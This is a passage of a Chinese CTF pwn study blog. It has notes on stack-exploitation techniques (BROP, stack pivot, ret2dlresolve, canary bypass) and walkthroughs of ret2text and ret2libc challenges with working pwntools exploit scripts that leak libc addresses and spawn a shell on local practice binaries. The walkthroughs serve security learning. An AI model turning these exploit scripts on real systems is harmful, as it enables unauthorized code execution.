id="没有binary怎么办-BROP-用的不多">没有binary怎么办-BROP(用的不多)</h4><hr><p><strong>目标</strong> ：在拿不到目标binary的条件下进行ROP<br><strong>条件</strong> ：必须先存在一个已知的stack overflow漏洞，而且攻击者知道如何触发这个漏洞服务器进程在crash之后会重新复活，复活的进程不会被re-rand</p><blockquote><p><a href="http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/">http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/</a><br><a href="http://ytliu.info/blog/2014/06/01/blind-return-oriented-programming-brop-attack-er/">http://ytliu.info/blog/2014/06/01/blind-return-oriented-programming-brop-attack-er/</a><br>HCTF 2016 出题人跑路了(pwn50)</p></blockquote><h4 id="劫持栈指针-stack-pivot">**劫持栈指针-stack pivot</h4><hr><h5 id="将栈劫持到其他攻击者控制的缓冲区">将栈劫持到其他攻击者控制的缓冲区</h5><p>向目标缓冲区填入栈数据（如ROP chains），然后劫持esp到目标缓冲区。劫持esp的方法有很多种，最常用的就是ROP时利用可以直接改写esp的gadget 如pop esp  ，ret ，具体binary具体分析<br><strong>利用条件</strong></p><ol><li>存在地址已知且内容可控的buffer<br>bss段，由于bss段尾端常有大量空余空间，所以bss段尾端也往往是stack pivot的目标<br>堆块，如果堆地址已泄且堆上的数据可控，那堆也可以作为stack pivot目标</li><li>控制流可劫持</li><li>存在劫持栈指针的gadgets</li></ol><p><strong>Stack piovt的动机</strong><br>· 溢出字节数有限，无法完成ROP<br>· 栈地址未知且无法泄露，但是某些利用技术却要求知道栈地址（ret2dlresolve）<br>· 劫持esp到攻击者控制的区域，也就变相的控制了栈中的数据，从而可以使非栈溢出的控制流劫持攻击也可以做ROP</p><blockquote><p>EKOPARTY CTF 2016 fuckzing-exploit-200(基于栈溢出)<br>HACKIM CTF 2015 - Exploitation 5(基于堆溢出)</p></blockquote><h4 id="利用动态链接绕过ASLR：ret2dlresolve、fake-linkmap">*利用动态链接绕过ASLR：ret2dlresolve、fake linkmap</h4><hr><p><strong>用法</strong><br>动态链接就是从函数名到地址的转换过程，所以可以通过动态链接器解析任何函数，无需leak<br>理论上任何可以stack pivot且FULLRELRO未开的题目都可以利用这种技术<br><strong>资源</strong><br><strong>前置技能：了解动态链接的过程</strong></p><blockquote><p><a href="http://blog.chinaunix.net/uid-24774106-id-3053007.html">http://blog.chinaunix.net/uid-24774106-id-3053007.html</a><br>《程序员的自我修养》</p></blockquote><p><strong>伪造动态链接的相关数据结构如linkmap、relplt</strong></p><blockquote><p><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a><br><a href="http://www.inforec.org/wp/?p=389">http://www.inforec.org/wp/?p=389</a><br>Codegate CTF Finals 2015 yocto(fake relplt) <br><a href="http://o0xmuhe.me/2016/10/25/yocto-writeup">http://o0xmuhe.me/2016/10/25/yocto-writeup</a><br>HITCON QUALS CTF 2015 readable(fake linkmap)<br><a href="http://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/">Hack.lu’s 2015 OREO</a></p></blockquote><p>******  <em><strong><u>理论上任何可以stack pivot且FULLRELRO未开的题目都可以使用这种技术</u></strong></em></p><h4 id="利用低地址低12bit绕过ASLR-Partial-Overwrite">利用低地址低12bit绕过ASLR-Partial Overwrite</h4><hr><p><strong>用法</strong><br>PIE开启时，一个32地址的高20位被随机化，低12bit不变。<br>改写低12bit绕过PIE，不仅在栈溢出使用，各种利用都经常使用。<br>eg：<br>return address=0x???abc<br>system(“/bin/sh”)=0x???def<br>overwrite abc by def, we can prompt a shell</p><blockquote><p><a href="http://ly0n.me/2015/07/30/bypass-aslr-with-partial-eip-overwrite/">了解partial overwrite</a><br>HCTF 2016 fheap(基于堆溢出)</p></blockquote><h4 id="绕过stack-canary">绕过stack canary</h4><hr><p><u>以上所有套路，遇到stack canary均无效</u><br><strong>不覆盖stack canary，只覆盖stack canary前的局部变量、指针：</strong> 几乎不行，编译器会根据占用内存大小从小到大排列变量；某些极限情况可以，一般都是精心构造的<br>** <strong>leak canary：</strong> printf泄露，canary一般从00开始<br><strong>overwrite canary：</strong> canary在TLS, TLS地址被随机化</p><h4 id="溢出位数不够怎么办：覆盖ebp、partial-overwrite">溢出位数不够怎么办：覆盖ebp、partial overwrite</h4><hr><p><strong>用法</strong><br>-可以覆盖Func2的ebp，会影响到Func1的esp，进而影响func1的ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Func1: </span><br><span class="line">call func2       leave(mov esp ebp, pop ebp)      </span><br><span class="line">ret(pop ip)</span><br><span class="line">Func2: </span><br><span class="line">stack overflow leave(move esp, ebp, pop ebp)    </span><br><span class="line">ret(pop ip)</span><br></pre></td></tr></table></figure><blockquote><p>XMAN 2016 广外女生-pwn<br>Codegate CTF Finals 2015，chess</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn学习记录——基本ROP-2</title>
      <link href="/posts/245cc06b.html"/>
      <url>/posts/245cc06b.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/">CTF Wiki</a></p></blockquote><h2 id="ret2libc">ret2libc</h2><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><p>关于got和plt的介绍：<a href="https://www.jianshu.com/p/6626a866ad66">介绍got plt以及libc.so</a></p><h2 id="ret2libc1">ret2libc1</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">题目下载</a></p><p>首先检查程序的安全保护</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565679204977.png" alt="1565679204977"></p><p>程序只开启了栈不可执行保护，下面丢到IDA里面看一下程序源代码</p><p>可以看到在执行 gets 函数的时候出现了栈溢出，<code>Alt+T</code>搜索发现跟ret2text一样具有system函数，但是不再是可以直接执行的<code>system(”/bin/sh“)</code>了</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565679630015.png" alt="1565679630015"></p><p>要使用system函数，需要将程序跳转到plt处，找到地址为0x08048460</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565680045134.png" alt="1565680045134"></p><p>所以需要我们手动将参数 <code>/bin/sh</code>传入进去，使用ROPgadget搜索</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc1 --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565679727715.png" alt="1565679727715"></p><p>正好存在，那么我们就可以控制程序直接返回到system函数，然后参数为<code>/bin/sh</code>获得shell</p><p>下面我们构造payload，经分析后无效数据填充的长度跟之前一样，还是0x70，然后在返回地址处覆盖system的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x08048720</span></span><br><span class="line">system = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,system,<span class="string">&#x27;bbbb&#x27;</span>,binsh])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后的数据才对应为函数的参数。</p><blockquote><p>注意：这里只有在plt表中调用system函数时才需要填充数据，如果使用的是程序中的call调用system函数则不需要填充数据</p></blockquote><h2 id="ret2libc2">ret2libc2</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">题目下载</a></p><p>checksec和丢到IDA里面查看后可以发现，程序跟ret2libc1基本一样，只是搜索不到字符串<code>/bin/sh</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565680681069.png" alt="1565680681069"></p><p>那么该怎么办呢？只能我们手动将字符串输入了。所以我们需要控制程序跳转两次，一次跳转到gets函数读取字符串（参数）<code>/bin/sh</code>到内存中，另一次跳转到system函数执行获取系统shell。</p><p>那么问题来了，gets读取的数据要保存到哪里呢。我们要寻找一块可读可写的buffer区，通常会寻找.bss段，在IDA里面查看可看到在.bss段里面存在一个buf2数组，地址是0x0804A080</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565681172235.png" alt="1565681172235"></p><p>我们检查一下这一块数据是否可读可写</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565681203653.png" alt="1565681203653"></p><p>接下来我们就需要考虑payload的构造了，先来搞清楚溢出覆盖后栈的情况</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565681203653.png" alt="1565682643051"></p><p>为了控制esp指针在gets函数执行完毕后可以向上移动（esp+4），在gets的返回地址填入<code>pop ; ret</code>指令，这样在执行system函数的时候，esp指针指向无效数据’aaaa’，buf2作为system的参数传入</p><p>使用ROPgadget工具找到可用的gadget</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565684239084.png" alt="1565684239084"></p><p>这里我选择<code>pop ebx ; ret</code>作为利用的gadget，当然<code>pop ebp ; ret</code>也可以，但是一般不建议对esp、ebp的值进行修改（为了避免程序寻址错误）。</p><p>gets函数和system函数的地址可以在IDA中查找 plt 表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line">gets = <span class="number">0x08048460</span></span><br><span class="line">pop_ret = <span class="number">0x0804843d</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,gets,pop_ret,buf2,system,<span class="string">&#x27;aaaa&#x27;</span>,buf2])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>-------分割线------</p><p>这里还有另外一种更简洁的覆盖方式，但是要在理解上面payload构造方法的基础上才能明白。</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565684697675.png" alt="1565684697675"></p><p>这是第二种方法的栈覆盖结构，具体原理跟上面一样，但是省去了寻找<code>pop ; ret</code>这种gadget的麻烦。构造的payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048490</span></span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line">gets = <span class="number">0x08048460</span></span><br><span class="line"><span class="comment">#pop_ret = 0x0804843d</span></span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*0x70,gets,pop_ret,buf2,system,&#x27;aaaa&#x27;,buf2])</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,gets,system,buf2,buf2])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>可以看到，同样也可以获得shell</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565684879691.png" alt="1565684879691"></p><h2 id="ret2libc3">ret2libc3</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">题目下载</a></p><h3 id="题目分析-3">题目分析</h3><p>同样，先检查程序，依旧是只开启了栈不可执行的32位程序，跟之前的一样，但是IDA查看会发现，这次system函数和/bin/sh都不存在了。</p><p>那么我们该如何得到system函数的地址呢？利用libc.so动态链接库。</p><p>在libc动态链接库中的函数之间的相对偏移是固定的，我们可以通过got表，泄露出某个函数的地址，然后再到libc中查找system的地址进行计算。这里有一个libc的查找工具可以使用：</p><p><a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></p><p>这个工具使用的数据库是在github上niklasb大佬整理维护的，<a href="https://github.com/niklasb/libc-database">传送门</a></p><p>查看IDA中的程序源代码</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565685731034.png" alt="1565685731034"></p><p>我们可以看到puts函数可以用来泄露输出已经执行过的函数的地址，这我们可以输出puts函数在got表中的地址，当然我们也可以选择输出 <code>__libc_start_main</code>函数的got表地址，这个函数基本存在于所有的程序当中，它是程序最初被执行的地方。</p><h3 id="利用思路-2">利用思路</h3><ul><li>执行程序泄露 __libc_start_main 地址，并且返回地址设置为 _start() 或者 main()，以便于下面再次执行程序</li><li>选择 libc 版本</li><li>通过接收puts函数输出的地址，计算libc中的地址与真实地址的偏移量，从而获得 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>利用计算得到的libc中的system函数地址和/bin/sh的地址，触发栈溢出执行 system(‘/bin/sh’)</li></ul><h3 id="payload编写">payload编写</h3><p>在第一次栈溢出用puts函数的地址覆盖函数返回地址时，puts函数的返回地址可以设置为_start()或main()函数地址。</p><h4 id="返回地址为-start-函数">返回地址为_start()函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">start = ret2libc3.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">puts = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,puts,start,libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;!?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main_addr)</span><br><span class="line">base_addr = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system = base_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>,system,<span class="string">&#x27;aaaa&#x27;</span>,binsh])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里我们泄露的是<code>__libc_start_main</code>函数的地址，若要泄露puts函数的地址，大同小异，稍微修改一下exp脚本即可</p><p>脚本在执行的时候，可能会检测到多个可用的libc，需要进行选择，我们选择其中一个即可</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565687324203.png" alt="1565687324203"></p><h4 id="返回地址为main-函数">返回地址为main()函数</h4><p>先将_start()换成main()，payload填充字符的偏移量不变，运行脚本会发现程序并不能正确获取到shell，添加GDB调试之后发现溢出多了8个字节的数据</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565686958753.png" alt="1565688624844"></p><p>所以我们对偏移量减少8个字节即112-8=104就可以成功溢出获得shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="comment">#start = ret2libc3.symbols[&#x27;_start&#x27;]</span></span><br><span class="line">main_addr = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*0x70,puts,start,libc_start_main_got])</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,puts,main_addr,libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;!?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main_addr)</span><br><span class="line">base_addr = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system = base_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*112,system,&#x27;aaaa&#x27;,binsh])</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>,system,<span class="string">&#x27;aaaa&#x27;</span>,binsh])</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="start-和main-的区别">_start()和main()的区别</h4><p>简单地说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。</p><p>我们可以看下本题的_start()函数内容，其包含main()和__libc_start_main()函数的调用，也就是说，它才是程序真正的入口：</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565686958753.png" alt="1565686958753"></p><blockquote><p>为啥会多出8个字符？</p><p>主要是因为我们两次设置不同返回地址函数的区别，即 _start() 和 main() 的区别， _start() 为程序的真正的入口、执行一定代码后才会进入main()执行，而当我们覆盖返回地址为main()函数地址时，实际上并不为程序原本的入口，但计算出的偏移量是基于程序入口计算的，因此payload的偏移量实际会偏小；至于为何刚刚好是8个字节，这个得深入调试分析 _start() 到 main() 之间的逻辑才能搞清楚，一般都是通过调试得知偏移差多少就可以做出题了。</p><p>在CTF-Wiki中的官方exp用的是main()作为返回地址，而且第二次payload直接就使用了104作为偏移，这令我百思不得其解。感谢 <a href="https://www.mi1k7ea.com/2019/03/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc/#%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%BAmain-%E5%87%BD%E6%95%B0">Mi1k7ea</a> 大佬提供的思路为我解决了这个困惑~~</p></blockquote><h2 id="练习：train-cs-nctu-edu-tw-ret2libc">练习：<a href="http://train.cs.nctu.edu.tw">train.cs.nctu.edu.tw</a>: ret2libc</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/train.cs.nctu.edu.tw/ret2libc/ret2libc">题目下载</a>         <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/train.cs.nctu.edu.tw/ret2libc/libc.so.6">libc下载</a></p><p>拿到题目先检查程序保护</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565689668742.png" alt="1565689668742"></p><p>老样子，32位程序，只开启了NX保护。丢到IDA里</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565689668742.png" alt="1565689729781"></p><p>可以看到，程序存在scanf溢出漏洞，并且程序运行的时候还打印出了<code>/bin/sh</code>和<code>puts</code>的地址，不禁微微窃喜</p><p>多次运行程序发现，字符串<code>/bin/sh</code>的地址是不变的，一直是<code>0x0804a02c</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565689906020.png" alt="1565689906020"></p><p>题目给了我们libc文件，那么我们就可以参考ret2libc3的思路，通过puts函数泄露libc中的地址，从而计算得到system的地址，与已知字符串/bin/sh的地址进行拼接便可溢出执行shell</p><p>如若是remote方式执行脚本，我们可以令libc为下载的libc.so.6文件，本地执行的话需要我们找到在本地与程序相链接的libc文件，使用<code>lld</code>命令进行查看</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565690280749.png" alt="1565690280749"></p><p>这个程序在本地链接的libc的路径为<code>/lib32/libc.so.6</code></p><p>**注意：**使用本地提供的libc文件就不能使用LibcSearcher这个工具进行查找，这里我们使用的是pwntools的ELF库</p><p>根据EBP和ESP的地址我们可以计算出偏移量：158-(120+1c)=0x20</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565690967593.png" alt="1565690967593"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># sh = remote(xxx.xxx.xxx,&#x27;xxxx&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x0804a02c</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;The address of function &quot;puts&quot; is &#x27;</span>)</span><br><span class="line">puts = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span> (puts)</span><br><span class="line">puts = <span class="built_in">int</span>(puts,<span class="number">16</span>)</span><br><span class="line">base = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>,system,<span class="string">&#x27;aaaa&#x27;</span>,binsh])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn学习记录——基本ROP-1</title>
      <link href="/posts/f7193a8.html"/>
      <url>/posts/f7193a8.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/">CTF Wiki</a></p></blockquote><h2 id="ret2text">ret2text</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text"><strong>题目下载</strong></a></p><p>首先，拿到题目我们先查一下保护</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565503449392.png" alt="1565503449392"></p><p>可以看到，程序是32位的，只开启了NX保护</p><p>下面我们拖到IDA里面看一下</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565503541683.png" alt="1565503541683"></p><p>很明显的gets函数溢出漏洞，先来搜索一下程序里面有没有可以直接利用的溢出漏洞，<code>Alt+T</code>搜索<code>system</code>关键字</p><p>可以看到，在secure()函数里面发现了可以直接调用<code>system(&quot;/bin/sh&quot;)</code>的代码，如果我们控制程序返回到这段代码的位置，那么就可以直接得到shell</p><p>首先我们在gdb中调试算出程序溢出需要的偏移量</p><p>找到get函数的地址，在peda中设置断点（这里若不显示地址，可以右键<code>Text View</code>查看）</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565504165523.png" alt="gets函数地址"></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565504282289.png" alt="设置断点"></p><p>使用 <code>r</code> 命令让程序跑起来，可以看到此时寄存器的内容</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565504391943.png" alt="1565504391943"></p><p>我们计算偏移量使用EBP和ESP的地址，字符串s的地址是从<code>ESP+0x1c</code>这个位置开始的，那么 偏移量=EBP-(ESP+0x1c)+4，这里<code>+4</code>是因为覆盖栈中保存的EBP的数据，才能到程序返回地址。offset=0xffffd158-(0xffffd0d0+0x1c)+4=0x70</p><p>下面我们再在IDA中找到调用system函数的地址<code>0x0804863A</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1565505391443.png" alt="1565505391443"></p><p>有了这些我们就可以编写exp脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">system = <span class="number">0x0804863A</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span> + p32(system)</span><br><span 